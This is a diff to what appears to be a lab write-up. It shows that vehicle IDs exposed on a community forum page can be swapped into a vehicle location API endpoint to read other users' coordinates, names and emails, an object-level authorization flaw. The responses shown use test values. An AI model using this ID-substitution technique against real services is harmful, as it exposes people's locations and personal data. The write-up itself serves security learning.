@@ -11,14 +11,31 @@ Endpoint: `/identity/api/v2/vehicle/abc327fc-42ed-4262-8ade-daeb4c7b24e4/locatio
 Response:
 
 ```
-{"carId":"abc327fc-42ed-4262-8ade-daeb4c7b24e4",
-"vehicleLocation":{"id":4,"latitude":"38.206348",
-"longitude":"-84.270172"},
-"fullName":"sheep",
-"email":"a@mail.com"}
+{
+    "carId":"abc327fc-42ed-4262-8ade-daeb4c7b24e4",
+    "vehicleLocation":{
+        "id":4,
+        "latitude":"38.206348",
+        "longitude":"-84.270172"
+    },
+    "fullName":"sheep",
+    "email":"a@mail.com"
+}
 ```
 
 Community page (`/forum`) expose the commenters vehicle id.
 ![response from community posts api](<CleanShot 2025-02-07 at 23.55.49.png>)
 
 By replacing my own vehicle id with the ids found on the community page I'm able to see other users vehicle information `/identity/api/v2/vehicle/<vehicleid>/location` ![response when replace the vehicle id](<CleanShot 2025-02-07 at 23.59.19.png>)
+
+```
+{
+    "carId":"4bae9968-ec7f-4de3-a3a0-ba1b2ab5e5e5",
+    "vehicleLocation":{
+        "id":3,
+        "latitude":"37.746880",
+        "longitude":"-84.301460"},
+        "fullName":"Robot",
+        "email":"robot001@example.com"
+}
+```
